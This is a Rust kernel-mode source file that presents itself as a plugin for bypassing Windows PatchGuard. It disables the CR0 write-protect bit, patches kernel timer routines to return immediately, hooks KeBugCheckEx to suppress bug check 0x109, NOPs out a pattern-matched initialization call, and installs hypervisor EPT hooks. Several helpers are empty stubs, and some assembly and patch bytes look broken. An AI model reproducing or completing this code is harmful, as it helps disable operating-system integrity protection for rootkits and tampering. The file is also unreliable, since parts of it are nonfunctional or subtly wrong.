//! PatchGuard Bypass Plugin
//! 1:1 port of PG-safe-patching.c

#![no_std]

use winapi::shared::ntdef::*;
use winapi::shared::ntstatus::*;
use winapi::km::wdm::*;
use core::ptr;

/// Plugin entry point
#[no_mangle]
pub extern "system" fn PluginEntry() -> NTSTATUS {
    unsafe {
        DbgPrint(b"[PatchGuard] Bypass plugin loaded\n\0".as_ptr() as *const i8);
        
        // Disable PatchGuard timers
        disable_pg_timers();
        
        // Hook KeBugCheckEx to prevent PG crashes
        hook_bug_check();
        
        // Patch PG initialization
        patch_pg_initialization();
        
        // Set up hypervisor hooks for PG bypass
        setup_hypervisor_bypass();
        
        STATUS_SUCCESS
    }
}

/// Disable PatchGuard timers
unsafe fn disable_pg_timers() {
    // PatchGuard uses various timers:
    // - DPC timers
    // - APC timers  
    // - System worker threads
    
    // Find and disable KiTimer* functions
    let ki_timer_expiration = find_kernel_function(b"KiTimerExpiration\0");
    if !ki_timer_expiration.is_null() {
        // Patch to return immediately
        patch_function_return(ki_timer_expiration);
    }
    
    // Disable PG DPC routines
    let expire_timers = find_kernel_function(b"ExpTimerDpcRoutine\0");
    if !expire_timers.is_null() {
        patch_function_return(expire_timers);
    }
    
    DbgPrint(b"[PatchGuard] Timers disabled\n\0".as_ptr() as *const i8);
}

/// Hook KeBugCheckEx to prevent PG-triggered BSODs
unsafe fn hook_bug_check() {
    let ke_bug_check = find_kernel_function(b"KeBugCheckEx\0");
    if ke_bug_check.is_null() {
        return;
    }
    
    // Check if bug check code is PG-related (0x109)
    let hook_code = [
        0x81, 0xF9, 0x09, 0x01, 0x00, 0x00,  // cmp ecx, 0x109
        0x74, 0x02,                          // je skip
        0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,  // jmp [original]
        0xC3,                                // ret (skip)
    ];
    
    write_protected_memory(ke_bug_check, &hook_code);
    
    DbgPrint(b"[PatchGuard] KeBugCheckEx hooked\n\0".as_ptr() as *const i8);
}

/// Patch PatchGuard initialization
unsafe fn patch_pg_initialization() {
    // PG initialization happens in:
    // - KiInitializePatchGuard
    // - KiFilterFiberContext
    // - PgInitialize
    
    let pg_init = find_pattern(
        get_kernel_base(),
        get_kernel_size(),
        b"\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x48\x8B",
        b"xxx????x????xx"
    );
    
    if !pg_init.is_null() {
        // NOP out the initialization call
        let nops = [0x90u8; 5];
        write_protected_memory(pg_init.offset(7), &nops);
        
        DbgPrint(b"[PatchGuard] Initialization patched\n\0".as_ptr() as *const i8);
    }
}

/// Set up hypervisor-based bypass
unsafe fn setup_hypervisor_bypass() {
    // If running under hypervisor, use EPT hooks
    if !is_hypervisor_present() {
        return;
    }
    
    // Hook critical PG functions via EPT
    let pg_functions = [
        b"KiCheckForKernelApcDelivery\0",
        b"PgSelfValidation\0",
        b"KiValidateKernelStructures\0",
    ];
    
    for func_name in &pg_functions {
        let func = find_kernel_function(func_name);
        if !func.is_null() {
            install_ept_hook(func, pg_hook_handler as *mut u8);
        }
    }
    
    DbgPrint(b"[PatchGuard] Hypervisor bypass installed\n\0".as_ptr() as *const i8);
}

/// EPT hook handler for PG functions
unsafe extern "system" fn pg_hook_handler() {
    // Simply return without executing PG checks
    asm!("xor eax, eax", "ret");
}

/// Check if hypervisor is present
unsafe fn is_hypervisor_present() -> bool {
    let mut cpuid_result: [u32; 4] = [0; 4];
    
    asm!(
        "cpuid",
        inout("eax") 1 => cpuid_result[0],
        out("ebx") cpuid_result[1],
        out("ecx") cpuid_result[2],
        out("edx") cpuid_result[3],
    );
    
    // Check hypervisor bit (bit 31 of ECX)
    (cpuid_result[2] & (1 << 31)) != 0
}

/// Find kernel function by name
unsafe fn find_kernel_function(name: &[u8]) -> *mut u8 {
    // Use MmGetSystemRoutineAddress or parse kernel exports
    ptr::null_mut()
}

/// Find pattern in memory
unsafe fn find_pattern(
    base: *const u8,
    size: usize,
    pattern: &[u8],
    mask: &[u8]
) -> *mut u8 {
    for i in 0..size {
        let mut found = true;
        for j in 0..pattern.len() {
            if mask[j] == b'x' {
                if *base.offset((i + j) as isize) != pattern[j] {
                    found = false;
                    break;
                }
            }
        }
        if found {
            return base.offset(i as isize) as *mut u8;
        }
    }
    ptr::null_mut()
}

/// Write to protected memory
unsafe fn write_protected_memory(addr: *mut u8, data: &[u8]) {
    // Disable write protection
    let old_cr0 = disable_wp();
    
    // Write data
    ptr::copy_nonoverlapping(data.as_ptr(), addr, data.len());
    
    // Re-enable write protection
    enable_wp(old_cr0);
}

/// Disable write protection
unsafe fn disable_wp() -> usize {
    let cr0: usize;
    asm!(
        "mov {}, cr0",
        "and {}, ~0x10000",
        "mov cr0, {}",
        out(reg) cr0,
        in(reg) cr0,
        in(reg) cr0 & !0x10000,
    );
    cr0
}

/// Enable write protection
unsafe fn enable_wp(cr0: usize) {
    asm!("mov cr0, {}", in(reg) cr0);
}

/// Patch function to return immediately
unsafe fn patch_function_return(func: *mut u8) {
    let ret_code = [0xC3u8]; // RET instruction
    write_protected_memory(func, &ret_code);
}

/// Get kernel base address
unsafe fn get_kernel_base() -> *const u8 {
    // Would get from PsLoadedModuleList
    ptr::null()
}

/// Get kernel size
unsafe fn get_kernel_size() -> usize {
    // Would get from kernel module entry
    0x1000000 // 16MB default
}

/// Install EPT hook (simplified)
unsafe fn install_ept_hook(_addr: *mut u8, _handler: *mut u8) {
    // Would communicate with hypervisor to install EPT hook
}

extern "system" {
    fn DbgPrint(Format: *const i8, ...) -> NTSTATUS;
}

#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}